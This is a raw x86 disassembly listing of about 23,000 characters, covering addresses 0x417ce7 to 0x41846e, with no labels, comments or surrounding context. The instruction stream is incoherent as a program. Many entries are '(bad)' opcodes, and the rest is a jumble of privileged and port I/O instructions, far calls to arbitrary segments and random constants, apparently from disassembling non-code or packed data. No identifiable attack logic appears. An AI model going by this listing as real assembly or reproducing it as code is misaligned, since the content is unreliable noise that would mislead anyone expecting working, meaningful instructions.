  417ce7:	adc    bl,BYTE PTR [eax]
  417ce9:	and    bl,dl
  417ceb:	or     al,0x40
  417ced:	retf   
  417cee:	and    al,0xd6
  417cf0:	jle    0x417d28
  417cf2:	xchg   ebx,eax
  417cf3:	pop    es
  417cf4:	cmp    esi,DWORD PTR [esi+0x30]
  417cf7:	imul   ebp,ecx,0xdeb6f4d7
  417cfd:	hlt    
  417cfe:	mov    cl,0x78
  417d00:	aaa    
  417d01:	mov    ebp,DWORD PTR [eax+0x9]
  417d04:	ud1    edx,DWORD PTR [edi+edx*4]
  417d08:	cmp    al,0x5c
  417d0a:	inc    esi
  417d0b:	stos   DWORD PTR es:[edi],eax
  417d0c:	add    eax,0xc6ee5ced
  417d11:	cmp    eax,0x623fa500
  417d16:	sahf   
  417d17:	cld    
  417d18:	jbe    0x417cba
  417d1a:	lahf   
  417d1b:	(bad)  
  417d1c:	aam    0xfc
  417d1e:	jno    0x417d5a
  417d20:	(bad)
  417d23:	mov    eax,0x255fa1e5
  417d28:	add    ch,bl
  417d2a:	adc    ch,BYTE PTR [edx+edx*8+0x5d]
  417d2e:	sti    
  417d2f:	aad    0xc3
  417d31:	stos   BYTE PTR es:[edi],al
  417d32:	push   ss
  417d33:	cmc    
  417d34:	push   eax
  417d35:	mov    eax,ds:0xc925e733
  417d3a:	add    dl,0xd9
  417d3d:	stc    
  417d3e:	fwait
  417d3f:	mov    ah,0xa2
  417d41:	jg     0x417d7f
  417d43:	xlat   BYTE PTR ds:[ebx]
  417d44:	aas    
  417d45:	daa    
  417d46:	mov    ebx,DWORD PTR [eax-0x63]
  417d49:	dec    eax
  417d4a:	and    eax,ecx
  417d4c:	sbb    al,0x35
  417d4e:	xchg   ecx,eax
  417d4f:	cmc    
  417d50:	popa   
  417d51:	cwde   
  417d52:	repnz sbb BYTE PTR [edi-0x21],cl
  417d56:	push   ebp
  417d57:	sbb    bh,BYTE PTR [eax-0x6d86e3ce]
  417d5d:	lods   al,BYTE PTR ds:[esi]
  417d5e:	and    edx,DWORD PTR [ebx+0x4237e458]
  417d64:	pop    esp
  417d65:	mov    bl,BYTE PTR [edi+0x25]
  417d68:	les    edx,FWORD PTR [eax-0x773d5d1b]
  417d6e:	add    DWORD PTR [ebp+eax*2+0x9],edi
  417d72:	vdivpd xmm6,xmm7,XMMWORD PTR [ebx+0xb]
  417d77:	mov    edi,0xed21f263
  417d7c:	and    bh,ah
  417d7e:	xchg   ecx,eax
  417d7f:	fisub  WORD PTR [edx+edi*8]
  417d82:	in     eax,dx
  417d83:	cli    
  417d84:	dec    esi
  417d85:	push   esi
  417d86:	sub    al,0x2d
  417d88:	pop    ss
  417d89:	lock cmp dh,BYTE PTR [edi-0x2290bfff]
  417d90:	out    dx,al
  417d91:	jae    0x417d68
  417d93:	ja     0x417d97
  417d95:	dec    edi
  417d96:	ins    DWORD PTR es:[edi],dx
  417d97:	xchg   esi,ecx
  417d99:	test   DWORD PTR [ecx+0x3eb8bccd],edi
  417d9f:	mov    bh,0x27
  417da1:	pop    eax
  417da2:	inc    ebx
  417da3:	hlt    
  417da4:	pop    esp
  417da5:	sar    BYTE PTR [edx+0x52],cl
  417da8:	xor    al,0x6f
  417daa:	pop    edx
  417dab:	ret    
  417dac:	inc    eax
  417dad:	std    
  417dae:	es stc 
  417db0:	or     edi,esi
  417db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db3:	sti    
  417db4:	cmp    edi,ecx
  417db6:	or     eax,0x39f7b038
  417dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dbc:	mov    ah,0xe
  417dbe:	test   eax,0x7017eb0b
  417dc3:	add    bh,BYTE PTR [ebp+0x124519fe]
  417dc9:	nop
  417dca:	outs   dx,BYTE PTR ds:[esi]
  417dcb:	frstor ds:0xad6d6a7f
  417dd1:	push   0x17
  417dd3:	xor    DWORD PTR [ebx+0x4bfcd9ce],edi
  417dd9:	add    bl,ah
  417ddb:	lods   eax,DWORD PTR ds:[esi]
  417ddc:	push   0xffffffba
  417dde:	xor    DWORD PTR fs:[ebp-0x48],0x51f8dc7e
  417de6:	stos   BYTE PTR es:[edi],al
  417de7:	and    al,0x97
  417de9:	or     al,0x1
  417deb:	popa   
  417dec:	pop    es
  417ded:	cwde   
  417dee:	into   
  417def:	sti    
  417df0:	cmp    dh,cl
  417df2:	jecxz  0x417d84
  417df4:	out    0x7f,al
  417df6:	addr16 int 0xe6
  417df9:	xor    BYTE PTR [eax+edx*4+0x1b4eec28],al
  417e00:	fucomp st(5)
  417e02:	repnz sahf 
  417e04:	fxch   st(1)
  417e06:	dec    esi
  417e07:	aad    0x46
  417e09:	sahf   
  417e0a:	aad    0xed
  417e0c:	push   ebp
  417e0d:	add    BYTE PTR [edx+ebp*4-0x1ac39416],cl
  417e14:	jne    0x417e83
  417e16:	bnd js 0x417e0d
  417e19:	sar    BYTE PTR [esi+0x5017e54d],cl
  417e1f:	(bad)  
  417e20:	mov    ah,0xc0
  417e22:	aam    0x2b
  417e24:	add    al,ch
  417e26:	ds pusha 
  417e28:	adc    eax,ebx
  417e2a:	call   0x7ecf:0x44685ef5
  417e31:	jne    0x417eb2
  417e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e34:	mov    bh,0x40
  417e36:	or     BYTE PTR [edi+0x3539813],al
  417e3c:	mov    WORD PTR [edx+0x18d825b],cs
  417e42:	fstp   DWORD PTR [ecx]
  417e44:	cwde   
  417e45:	fwait
  417e46:	imul   eax,DWORD PTR [edi+0x5d16125],0xffffffaf
  417e4d:	lods   al,BYTE PTR ds:[esi]
  417e4e:	sbb    esi,edx
  417e50:	clc    
  417e51:	jne    0x417e75
  417e53:	cmp    al,0x5b
  417e55:	adc    ebx,DWORD PTR ds:0xd90f66dd
  417e5b:	inc    ecx
  417e5c:	xor    al,0xb7
  417e5e:	jmp    DWORD PTR [ebx+0xdc6690b]
  417e64:	xchg   ebp,eax
  417e65:	mov    cl,0xa4
  417e67:	aas    
  417e68:	push   ds
  417e69:	cmp    BYTE PTR ds:0x2ca99f82,0xe8
  417e70:	mov    ds:0x83964794,al
  417e75:	pop    ss
  417e76:	mov    ds:0xd97109e,eax
  417e7b:	adc    al,0x6d
  417e7d:	in     al,0xda
  417e7f:	test   eax,0x41bcd7c
  417e84:	pop    ds
  417e85:	sahf   
  417e86:	sbb    bl,BYTE PTR [edi]
  417e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e89:	outs   dx,DWORD PTR ds:[esi]
  417e8a:	call   0xcc95:0xdefcf7a9
  417e91:	jae    0x417e53
  417e93:	add    bh,BYTE PTR [ebx]
  417e95:	ins    DWORD PTR es:[edi],dx
  417e96:	fiadd  DWORD PTR [ecx+0x4e]
  417e99:	ds test eax,0x82605ab2
  417e9f:	xor    dl,BYTE PTR [esp+edi*2]
  417ea2:	jo     0x417e72
  417ea4:	pop    esp
  417ea5:	cmp    edx,0x46
  417ea8:	push   0xffffff81
  417eaa:	sub    ebp,DWORD PTR [edi-0x58f7f60e]
  417eb0:	jno    0x417e9a
  417eb2:	mov    ds:0x3a094d7d,eax
  417eb7:	inc    esi
  417eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eb9:	inc    ebp
  417eba:	cmp    BYTE PTR [eax+0x6bd73d8c],cl
  417ec0:	inc    ebp
  417ec1:	cli    
  417ec2:	fnsave [esi+0xb2a07a0]
  417ec8:	sbb    al,0x23
  417eca:	(bad)  
  417ecb:	mov    eax,edi
  417ecd:	(bad)  
  417ece:	mov    al,ds:0xe9772845
  417ed3:	shl    al,cl
  417ed5:	xchg   ebp,eax
  417ed6:	sbb    al,0xc
  417ed8:	xchg   ebp,eax
  417ed9:	mov    ecx,0x3328fa63
  417ede:	jno    0x417ee1
  417ee0:	pop    edx
  417ee1:	pop    ebx
  417ee2:	cli    
  417ee3:	(bad)  
  417ee5:	ja     0x417ed0
  417ee7:	mov    al,bh
  417ee9:	(bad)  
  417eea:	push   ebp
  417eeb:	mov    DWORD PTR [ecx+0xf],0x8b1221c3
  417ef2:	mov    bl,0xab
  417ef4:	xor    al,0xe0
  417ef6:	outs   dx,BYTE PTR ds:[esi]
  417ef7:	xchg   esi,eax
  417ef8:	gs ja  0x417f23
  417efb:	pop    ebx
  417efc:	mov    bh,0xfa
  417efe:	jmp    0x417edf
  417f00:	scas   eax,DWORD PTR es:[edi]
  417f01:	sub    eax,0xa7216994
  417f06:	popa   
  417f07:	ins    BYTE PTR es:[edi],dx
  417f08:	push   eax
  417f09:	fdiv   DWORD PTR ds:0x4fddd645
  417f0f:	stos   DWORD PTR es:[edi],eax
  417f10:	xchg   bh,dh
  417f12:	fnstsw WORD PTR [esi+0x1]
  417f15:	dec    eax
  417f16:	adc    al,0x2
  417f18:	cwde   
  417f19:	adc    al,dh
  417f1b:	stos   BYTE PTR es:[edi],al
  417f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f1d:	mov    BYTE PTR [eax+0x58],ch
  417f20:	fs inc eax
  417f22:	pop    esp
  417f23:	cmp    al,0x45
  417f25:	je     0x417f15
  417f27:	retf   
  417f28:	cmp    al,0x25
  417f2a:	call   0xb84ca207
  417f2f:	push   es
  417f30:	addr16 out dx,al
  417f32:	jbe    0x417f91
  417f34:	or     esp,eax
  417f36:	out    dx,al
  417f37:	out    dx,al
  417f38:	mov    esi,0x4b1139c
  417f3d:	test   DWORD PTR [eax-0x219dc180],0xb3d5fc12
  417f47:	jo     0x417fa1
  417f49:	push   0x1f021c84
  417f4e:	in     eax,0x9e
  417f50:	mov    esp,0xc73264d9
  417f55:	in     eax,0x8f
  417f57:	mov    dh,0xd6
  417f59:	xchg   DWORD PTR [edx+esi*8+0xd],edi
  417f5d:	adc    al,0xe0
  417f5f:	pop    ebp
  417f60:	and    ecx,DWORD PTR [ecx+0x5c]
  417f63:	xchg   edx,eax
  417f64:	addr16 (bad) 
  417f66:	into   
  417f67:	fxch   st(0)
  417f69:	pop    es
  417f6a:	(bad)  [edx-0x3b8dfeb0]
  417f70:	out    dx,al
  417f71:	and    ch,BYTE PTR [edi-0x43]
  417f74:	hlt    
  417f75:	sti    
  417f76:	jle    0x417f43
  417f78:	and    BYTE PTR [esi-0x44],al
  417f7b:	xchg   esi,eax
  417f7c:	and    DWORD PTR [esi+0x270bd531],eax
  417f82:	lods   eax,DWORD PTR ds:[esi]
  417f83:	xchg   esi,eax
  417f84:	jle    0x417fa8
  417f86:	(bad)  
  417f87:	nop
  417f88:	pusha  
  417f89:	or     ecx,DWORD PTR [esi-0x34f12e9d]
  417f8f:	or     BYTE PTR [edx],bl
  417f91:	push   0x5b
  417f93:	or     bl,BYTE PTR [eax+eiz*2]
  417f96:	rcr    ebx,cl
  417f98:	push   0xffffffb0
  417f9a:	packssdw mm0,QWORD PTR [edi-0x53]
  417f9e:	mov    edi,0x60c4bb7a
  417fa3:	into   
  417fa4:	xchg   BYTE PTR [edx+0x2b],dh
  417fa7:	xlat   BYTE PTR ds:[ebx]
  417fa8:	js     0x417fc0
  417faa:	(bad)  
  417fab:	retf   
  417fac:	sbb    eax,0x70d4cbea
  417fb1:	scas   eax,DWORD PTR es:[edi]
  417fb2:	dec    ebp
  417fb3:	test   al,0x41
  417fb5:	push   ebp
  417fb6:	scas   eax,DWORD PTR es:[edi]
  417fb7:	mov    esp,0xdf25bb1d
  417fbc:	das    
  417fbd:	retf   
  417fbe:	xchg   ecx,eax
  417fbf:	loopne 0x417f74
  417fc1:	mov    ebx,0x39adb29e
  417fc6:	mov    eax,ds:0x3089c973
  417fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fcc:	sbb    dl,BYTE PTR [esp+esi*4+0x671b6eec]
  417fd3:	rol    DWORD PTR [esi+0xd],0x8a
  417fd7:	sub    DWORD PTR [ecx-0x2d68f6a1],esp
  417fdd:	into   
  417fde:	in     eax,dx
  417fdf:	scas   eax,DWORD PTR es:[edi]
  417fe0:	rcr    BYTE PTR [edi-0x5e],cl
  417fe3:	es stos BYTE PTR es:[edi],al
  417fe5:	into   
  417fe6:	mov    ebp,0xbd244e7d
  417feb:	(bad)  [edi+edx*4+0x23]
  417fef:	in     eax,0x8d
  417ff1:	cld    
  417ff2:	mov    dh,0x9e
  417ff4:	jo     0x417fc6
  417ff6:	test   BYTE PTR cs:[eax-0x6d],bh
  417ffa:	(bad)  
  417ffb:	out    dx,al
  417ffc:	and    al,0x3f
  417ffe:	jl     0x418020
  418000:	outs   dx,BYTE PTR ds:[esi]
  418001:	(bad)  
  418003:	xor    ecx,ebx
  418005:	push   esp
  418006:	mov    ebp,0x1cc23a1d
  41800b:	inc    ebx
  41800c:	fimul  DWORD PTR [ecx]
  41800e:	cmp    DWORD PTR [eax+0x67],0x72
  418012:	popf   
  418013:	lods   eax,DWORD PTR ds:[esi]
  418014:	push   0x37
  418016:	add    esp,edx
  418018:	push   esp
  418019:	push   esi
  41801a:	inc    edx
  41801b:	add    bl,ah
  41801d:	loope  0x417fcb
  41801f:	pop    ebp
  418020:	mov    ebx,0xdf3cdada
  418025:	sbb    al,0x99
  418027:	add    BYTE PTR [ebx+edx*1-0x31d6dc1a],bl
  41802e:	add    eax,0xe218e50c
  418033:	xchg   ah,al
  418035:	mov    eax,0xf98089d
  41803a:	aad    0xee
  41803c:	lahf   
  41803d:	jge    0x4180b3
  41803f:	pop    ecx
  418040:	xlat   BYTE PTR ds:[ebx]
  418041:	sub    bl,dl
  418043:	clc    
  418044:	xchg   DWORD PTR [edi+0xc],esi
  418047:	data16 loopne 0x418060
  41804a:	enter  0x1aea,0xc7
  41804e:	sbb    al,0x92
  418050:	in     al,0x11
  418052:	or     al,0xfe
  418054:	or     bh,ah
  418056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418057:	push   edi
  418058:	aaa    
  418059:	push   esp
  41805a:	sub    eax,0xbc81b5e1
  41805f:	sbb    al,0xe2
  418061:	or     eax,DWORD PTR es:[ecx]
  418064:	pop    es
  418065:	push   0xe
  418067:	shl    edi,0xcd
  41806a:	in     al,0xf9
  41806c:	xchg   esi,eax
  41806d:	loop   0x417ff2
  41806f:	in     al,dx
  418070:	in     eax,0x82
  418072:	jno    0x418017
  418074:	scas   al,BYTE PTR es:[edi]
  418075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418076:	pop    esp
  418077:	mov    dh,BYTE PTR [edi-0x70]
  41807a:	mov    dh,0x87
  41807c:	rcl    esp,cl
  41807e:	iret   
  41807f:	cmp    eax,0xd5dd4a65
  418084:	cmp    al,0xea
  418086:	das    
  418087:	ins    BYTE PTR es:[edi],dx
  418088:	mov    dl,0x88
  41808a:	outs   dx,BYTE PTR ds:[esi]
  41808b:	cli    
  41808c:	xor    BYTE PTR [eax+0x3c2fa9c4],0xc9
  418093:	or     al,0xed
  418095:	lahf   
  418096:	jns    0x41801c
  418098:	(bad)  [edx+0x5f71e34d]
  41809e:	test   BYTE PTR [edi-0x5a],al
  4180a1:	aam    0x23
  4180a3:	imul   ecx,DWORD PTR [edx-0x616114a1],0x7b
  4180aa:	and    ebp,ecx
  4180ac:	lea    edi,[ebp-0x338719a7]
  4180b2:	and    DWORD PTR [eax],edi
  4180b4:	mov    dl,0xab
  4180b6:	cmp    bh,BYTE PTR [edi]
  4180b8:	jb     0x418075
  4180ba:	mov    ah,0xc0
  4180bc:	test   DWORD PTR [edx+0x5e9d9653],0xc26ccad8
  4180c6:	rol    cl,0xf7
  4180c9:	and    DWORD PTR [ecx],0xf352ae1f
  4180cf:	push   cs
  4180d0:	adc    edi,edi
  4180d2:	mov    esp,0x2e980eb7
  4180d7:	dec    ebx
  4180d8:	mov    al,ds:0xab57ff92
  4180dd:	mov    eax,ds:0xc668aa65
  4180e2:	inc    ebx
  4180e3:	sbb    al,0xc7
  4180e5:	cmp    cl,al
  4180e7:	jle    0x4180e5
  4180e9:	cmp    bh,BYTE PTR [edx]
  4180eb:	loope  0x41806d
  4180ed:	stos   BYTE PTR es:[edi],al
  4180ee:	add    eax,0x29660c84
  4180f3:	adc    BYTE PTR [eax+0x39],ch
  4180f6:	jmp    0x736e:0x35116266
  4180fd:	push   ss
  4180fe:	and    ah,BYTE PTR [esi]
  418100:	jbe    0x41815e
  418102:	loopne 0x4180c7
  418104:	scas   eax,DWORD PTR es:[edi]
  418105:	fst    DWORD PTR [esi]
  418107:	cmc    
  418108:	test   al,0x2b
  41810a:	(bad)  
  41810b:	popf   
  41810c:	je     0x418136
  41810e:	sbb    al,0x5e
  418110:	jmp    0x418148
  418112:	jg     0x418178
  418114:	push   edi
  418115:	add    edx,DWORD PTR [esp+ecx*8-0x5420ab92]
  41811c:	and    edx,DWORD PTR [edi-0xcd48151]
  418122:	xlat   BYTE PTR ds:[ebx]
  418123:	and    cl,bl
  418125:	inc    ebx
  418126:	mov    cl,0x25
  418128:	or     eax,0xb2b167a0
  41812d:	sahf   
  41812e:	scas   al,BYTE PTR es:[edi]
  41812f:	std    
  418130:	sub    esp,edi
  418132:	shl    DWORD PTR [eax-0x26],cl
  418135:	mov    BYTE PTR [ebx+0x626b4ad6],cl
  41813b:	adc    BYTE PTR [ebx+0x26],dl
  41813e:	into   
  41813f:	nop
  418140:	enter  0x5515,0xa4
  418144:	sub    al,0x6e
  418146:	out    0xf9,al
  418148:	inc    eax
  418149:	or     edx,DWORD PTR [ebx+ebx*8-0x14]
  41814d:	ja     0x418182
  41814f:	sub    ch,dh
  418151:	xlat   BYTE PTR ds:[ebx]
  418152:	and    BYTE PTR [esi+0x1b],dl
  418155:	jno    0x41816f
  418157:	(bad)  
  418158:	aam    0xa4
  41815a:	ret    0x9d74
  41815d:	clc    
  41815e:	ror    DWORD PTR [eax-0x6866b245],cl
  418164:	shr    eax,1
  418166:	loope  0x4180e8
  418168:	outs   dx,BYTE PTR ds:[esi]
  418169:	xchg   esi,eax
  41816a:	(bad)  
  41816b:	cli    
  41816c:	or     DWORD PTR [esp+ecx*2+0x5cccb77f],eax
  418173:	mov    edx,0x41c40982
  418178:	xor    al,0x86
  41817a:	cmp    al,0x6
  41817c:	jle    0x4181e8
  41817e:	sbb    DWORD PTR [esi],ebx
  418180:	adc    bl,dl
  418182:	pop    ebp
  418183:	jl     0x41817c
  418185:	sbb    BYTE PTR [esi-0x269ec325],0xc0
  41818c:	das    
  41818d:	or     ebx,DWORD PTR [edi-0x23]
  418190:	xor    esi,ecx
  418192:	mov    ecx,0xab05a90b
  418197:	pop    ss
  418198:	fsubr  QWORD PTR [edx]
  41819a:	enter  0x255f,0x34
  41819e:	mov    bh,0xb4
  4181a0:	daa    
  4181a1:	or     ebx,DWORD PTR [edx-0x6d]
  4181a4:	aas    
  4181a5:	cmp    dh,ah
  4181a7:	push   0x33
  4181a9:	dec    eax
  4181aa:	cmp    ecx,DWORD PTR [esi-0x37]
  4181ad:	add    esi,DWORD PTR [esi+0x722fdf46]
  4181b3:	and    ecx,DWORD PTR [edi]
  4181b5:	repnz sub bh,ch
  4181b8:	callw  0x12f7
  4181bc:	std    
  4181bd:	sbb    BYTE PTR [ecx-0x41300e45],dh
  4181c3:	dec    edx
  4181c4:	ins    BYTE PTR es:[edi],dx
  4181c5:	je     0x418229
  4181c7:	dec    edi
  4181c8:	jl     0x41823e
  4181ca:	nop
  4181cb:	xor    edx,DWORD PTR [edx+0xddb5f0e]
  4181d1:	adc    eax,0xe5f88cd6
  4181d6:	pop    esi
  4181d7:	push   ecx
  4181d8:	data16 out dx,al
  4181da:	sbb    BYTE PTR [edx+0x66e17d30],dl
  4181e0:	push   esp
  4181e1:	pushf  
  4181e2:	clc    
  4181e3:	scas   al,BYTE PTR es:[edi]
  4181e4:	into   
  4181e5:	sar    BYTE PTR [ebx],1
  4181e7:	leave  
  4181e8:	mov    cl,0x6e
  4181ea:	outs   dx,BYTE PTR ds:[esi]
  4181eb:	retf   
  4181ec:	mov    eax,DWORD PTR ds:0x8dbb6502
  4181f2:	mov    ds:0xd3f0b5f9,eax
  4181f7:	push   ebx
  4181f8:	sbb    eax,0x3bd9be1c
  4181fd:	addr16 cmp al,0x34
  418200:	fldl2t 
  418202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418203:	ret    
  418204:	(bad)  
  418205:	outs   dx,DWORD PTR ds:[esi]
  418206:	test   eax,0xb590f1fc
  41820b:	jnp    0x41827c
  41820d:	jmp    0x7386c256
  418212:	pop    ecx
  418213:	inc    edx
  418214:	push   edx
  418215:	sbb    ebp,esp
  418217:	mov    DWORD PTR [eax],edi
  418219:	mov    edx,edx
  41821b:	clc    
  41821c:	call   0xb0ef:0x6997b418
  418223:	loop   0x418207
  418225:	ficom  DWORD PTR [ecx+0x4c111d3d]
  41822b:	es das 
  41822d:	fwait
  41822e:	aam    0x32
  418230:	push   esi
  418231:	imul   ecx
  418233:	sbb    al,0xac
  418235:	adc    al,0x5a
  418237:	dec    ebx
  418238:	test   dh,cl
  41823a:	addr16 mov eax,0x1ccc364a
  418240:	sub    BYTE PTR [edi+0x62021726],0xc0
  418247:	stos   BYTE PTR es:[di],al
  418249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41824a:	shl    DWORD PTR [ebx],1
  41824c:	popf   
  41824d:	call   0xfdd77d57
  418252:	lods   eax,DWORD PTR ds:[esi]
  418253:	or     DWORD PTR [ebx+0x3f],edx
  418256:	sbb    dl,BYTE PTR [edx]
  418258:	not    BYTE PTR [eax+0x6d]
  41825b:	inc    esi
  41825c:	ja     0x418259
  41825e:	addr16 (bad) 
  418260:	mov    eax,0xf50fd46a
  418265:	imul   esp,ebx,0x56ba6b40
  41826b:	inc    ecx
  41826c:	cmp    edi,edi
  41826e:	scas   al,BYTE PTR es:[edi]
  41826f:	xchg   ebp,eax
  418270:	in     eax,dx
  418271:	push   edi
  418272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418273:	push   ds
  418274:	call   0x1f4e67b8
  418279:	cmp    DWORD PTR [eax-0x75],ecx
  41827c:	sbb    ebx,edi
  41827e:	adc    ebx,DWORD PTR [ebp+0x1b24b85f]
  418284:	cmp    bl,cl
  418286:	push   ecx
  418287:	retf   
  418288:	push   ebp
  418289:	fmul   DWORD PTR [esi]
  41828b:	push   es
  41828c:	mov    ebx,0x4252ad8
  418291:	mov    dh,0x28
  418293:	cmp    ebp,DWORD PTR [eax+eiz*8+0x5d]
  418297:	addr16 mov edx,0x997bcc22
  41829d:	mov    eax,0x7e4dbc71
  4182a2:	add    DWORD PTR [esi-0x19],ebx
  4182a5:	push   esi
  4182a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182a7:	cmc    
  4182a8:	pop    esp
  4182a9:	cmp    eax,0x81389398
  4182ae:	adc    BYTE PTR [ecx-0x74],ah
  4182b1:	xor    al,0xd7
  4182b3:	xor    al,0xa0
  4182b5:	jl     0x4182f2
  4182b7:	pop    esi
  4182b8:	push   edi
  4182b9:	fcom   QWORD PTR [ebp-0x6b]
  4182bc:	adc    eax,DWORD PTR [edi]
  4182be:	xchg   edx,eax
  4182bf:	push   edi
  4182c0:	jo     0x4182af
  4182c2:	xchg   edi,eax
  4182c3:	mov    ds:0x5995a5a0,eax
  4182c8:	loope  0x4182a1
  4182ca:	adc    DWORD PTR [ebx-0x6250bdb2],ecx
  4182d0:	test   DWORD PTR [esi-0x6d],edx
  4182d3:	icebp  
  4182d4:	pop    ebp
  4182d5:	jle    0x418273
  4182d7:	dec    ecx
  4182d8:	loopne 0x41831c
  4182da:	outs   dx,DWORD PTR ds:[esi]
  4182db:	mov    al,ds:0xd14499ec
  4182e0:	leave  
  4182e1:	aaa    
  4182e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182e3:	sub    DWORD PTR [edi-0x6547a66c],esi
  4182e9:	cld    
  4182ea:	push   es
  4182eb:	xor    al,0x56
  4182ed:	sub    DWORD PTR [ebx+0x6368385d],0xffffffd6
  4182f4:	jo     0x418300
  4182f6:	gs mov bl,0xf7
  4182f9:	ss dec esi
  4182fb:	and    cl,cl
  4182fd:	int    0xf2
  4182ff:	ins    BYTE PTR es:[edi],dx
  418300:	cmp    ah,bh
  418302:	pop    ss
  418303:	shl    BYTE PTR [edi+0x15],1
  418306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418307:	push   esi
  418308:	in     eax,dx
  418309:	cdq    
  41830a:	out    0xc1,eax
  41830c:	in     al,dx
  41830d:	sti    
  41830e:	cmp    eax,0x1f997039
  418313:	mov    edi,0x7a3903b8
  418318:	pop    edi
  418319:	scas   eax,DWORD PTR es:[edi]
  41831a:	mov    ds:0xf4976b77,al
  41831f:	fwait
  418320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418321:	mov    ebx,0xf24380dd
  418326:	mov    al,0x39
  418328:	stos   BYTE PTR es:[edi],al
  418329:	inc    eax
  41832a:	xchg   ebx,eax
  41832b:	ins    DWORD PTR es:[edi],dx
  41832c:	ss pop esp
  41832e:	dec    ebx
  41832f:	test   eax,0xebd3a021
  418334:	mov    dh,0x2c
  418336:	push   0x2e
  418338:	xor    eax,0x3aa4646d
  41833d:	xor    al,0x6
  41833f:	daa    
  418340:	adc    eax,0xd43bdc2f
  418345:	out    dx,eax
  418346:	sub    al,0x91
  418348:	xchg   esi,eax
  418349:	xchg   ebp,eax
  41834a:	pop    ss
  41834b:	rcr    BYTE PTR [edi+0x6f],0x1
  41834f:	mov    esi,0x47251b01
  418354:	shl    BYTE PTR [ecx],0xdc
  418357:	jmp    0x418377
  418359:	jmp    0x418342
  41835b:	into   
  41835c:	push   ds
  41835d:	or     eax,0xcc66edf7
  418362:	icebp  
  418363:	mov    al,ds:0xbb6a272d
  418368:	enter  0x6bf4,0xf3
  41836c:	aaa    
  41836d:	ret    
  41836e:	lods   al,BYTE PTR ds:[esi]
  41836f:	rol    DWORD PTR [ecx+0x579bd0f3],0xc6
  418376:	leave  
  418377:	xchg   esi,eax
  418378:	mov    eax,ds:0x35d6c62c
  41837d:	rcr    BYTE PTR [ebx+0x40ee91b1],1
  418383:	or     BYTE PTR [eax+0x7a13431a],ah
  418389:	fisubr WORD PTR es:[edi-0x20d8155e]
  418390:	mov    edx,0xc7a570bb
  418395:	mov    cl,0x1
  418397:	xor    al,0x67
  418399:	es popf 
  41839b:	ss cmp cl,al
  41839e:	aaa    
  41839f:	cwde   
  4183a0:	jl     0x41841d
  4183a2:	xchg   BYTE PTR [edi],dh
  4183a4:	sbb    DWORD PTR [eax+0x6fda6896],ebp
  4183aa:	ret    
  4183ab:	enter  0xeb4d,0xb1
  4183af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183b0:	pop    es
  4183b1:	out    dx,eax
  4183b2:	cmp    DWORD PTR [ecx-0x1bb9953d],esi
  4183b8:	push   ds
  4183b9:	jmp    0x418341
  4183bb:	xchg   DWORD PTR [esi+0x27],edx
  4183be:	hlt    
  4183bf:	dec    edi
  4183c0:	mov    bh,0x36
  4183c2:	dec    esp
  4183c3:	imul   esi
  4183c5:	das    
  4183c6:	sbb    BYTE PTR [edx-0x232435ac],cl
  4183cc:	push   es
  4183cd:	cmc    
  4183ce:	xchg   ebx,eax
  4183cf:	jns    0x4183a9
  4183d1:	retf   
  4183d2:	retf   0x66fd
  4183d5:	sbb    eax,0xf02a2ccc
  4183da:	and    eax,0xd146fd69
  4183df:	into   
  4183e0:	lea    ebp,[edx-0x5e]
  4183e3:	adc    al,0x41
  4183e5:	adc    bh,dh
  4183e7:	push   esi
  4183e8:	inc    ebp
  4183e9:	and    esp,DWORD PTR [esi]
  4183eb:	dec    ebx
  4183ec:	mov    ch,0x8f
  4183ee:	(bad)  
  4183ef:	xor    al,0x2
  4183f1:	inc    edx
  4183f2:	dec    ecx
  4183f3:	(bad)  
  4183f4:	fmul   st,st(6)
  4183f6:	div    DWORD PTR [ecx-0x18]
  4183f9:	dec    ebp
  4183fa:	push   eax
  4183fb:	stos   DWORD PTR es:[edi],eax
  4183fc:	call   0x151c:0x9d26737a
  418403:	in     al,dx
  418404:	repnz mov eax,ds:0xe05c7d90
  41840a:	out    0xb5,al
  41840c:	push   cs
  41840d:	imul   ebp,DWORD PTR [edi],0x2f60263f
  418413:	(bad)  
  418414:	test   eax,0xab35105d
  418419:	test   al,0x41
  41841b:	cld    
  41841c:	cmc    
  41841d:	lods   al,BYTE PTR ds:[esi]
  41841e:	jo     0x418485
  418420:	fwait
  418421:	sbb    edx,edx
  418423:	cmp    al,0x16
  418425:	sub    edx,DWORD PTR [eax]
  418427:	fsub   QWORD PTR [edi-0x321e9157]
  41842d:	cmp    BYTE PTR [ecx],dh
  41842f:	push   0x77ae59da
  418434:	pop    ecx
  418435:	inc    eax
  418436:	inc    esp
  418437:	icebp  
  418438:	and    bl,BYTE PTR [edi-0xe2069c4]
  41843e:	push   ebx
  41843f:	and    ecx,eax
  418441:	push   edi
  418442:	ftst   
  418444:	das    
  418445:	sbb    eax,0x2fc4d743
  41844a:	cmp    BYTE PTR [ecx+0x37],0x5a
  41844e:	cld    
  41844f:	jno    0x4183f3
  418451:	nop
  418452:	inc    esp
  418453:	jge    0x4183f4
  418455:	stos   DWORD PTR es:[edi],eax
  418456:	xchg   ebp,eax
  418457:	jns    0x418414
  418459:	mov    al,ds:0x7120a374
  41845e:	imul   esi,DWORD PTR [edi+0x39],0x789f1632
  418465:	sbb    bh,ch
  418467:	pop    eax
  418468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418469:	jne    0x4184e3
  41846b:	aaa    
  41846c:	hlt    
  41846d:	lods   eax,DWORD PTR ds:[esi]
  41846e:	xor    eax,0xcc393217
